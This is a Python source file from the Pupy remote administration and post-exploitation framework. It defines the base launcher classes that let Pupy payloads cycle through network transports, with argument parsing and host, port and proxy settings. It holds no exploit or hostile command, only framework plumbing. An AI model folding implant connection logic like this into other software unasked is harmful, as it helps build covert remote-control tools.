# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
"""
launchers bring an abstraction layer over transports to allow pupy payloads to try multiple transports until one succeed or perform custom actions on their own.
"""

__all__ = (
    'LauncherError', 'LauncherArgumentParser', 'BaseLauncher'
)

import argparse


class LauncherError(Exception):
    __slots__ = ()


class LauncherArgumentParser(argparse.ArgumentParser):
    __slots__ = ()

    def __init__(self, *args, **kwargs):
        argparse.ArgumentParser.__init__(self, *args, **kwargs)

    def exit(self, status=0, message=None):
        raise LauncherError(message)

    def error(self, message):
        self.exit(2, str('%s: error: %s\n') % (self.prog, message))


class BaseLauncherMetaclass(type):
    def __init__(self, *args, **kwargs):
        super(BaseLauncherMetaclass, self).__init__(*args, **kwargs)
        self.init_argparse()


class BaseLauncher(object):
    arg_parser = None
    args = None
    name = None

    __slots__ = (
        'args', 'host', 'hostname', 'port',
        '_transport', 'proxies', '_default_transport'
    )
    __metaclass__ = BaseLauncherMetaclass

    def __init__(self):
        self.args = None
        self.reset_connection_info()
        self._default_transport = None

    def iterate(self):
        ''' iterate must be an iterator returning rpyc stream instances '''
        raise NotImplementedError('iterate launcher\'s method needs to be implemented')

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = LauncherArgumentParser(
            prog=cls.__name__, description=cls.__doc__)

    def parse_args(self, args):
        if not self.args:
            self.args = self.arg_parser.parse_args(args)

        if hasattr(self.args, 'transport'):
            self.set_default_transport(self.args.transport)

    def set_default_transport(self, transport):
        self._default_transport = transport

    @property
    def transport(self):
        return self._transport or self._default_transport

    def set_connection_info(self, hostname, host, port, proxies, transport=None):
        self.hostname = hostname
        self.host = host
        self.port = port
        self.proxies = proxies
        self._transport = transport

    def reset_connection_info(self):
        self.hostname = None
        self.host = None
        self.port = None
        self.proxies = None
        self._transport = None
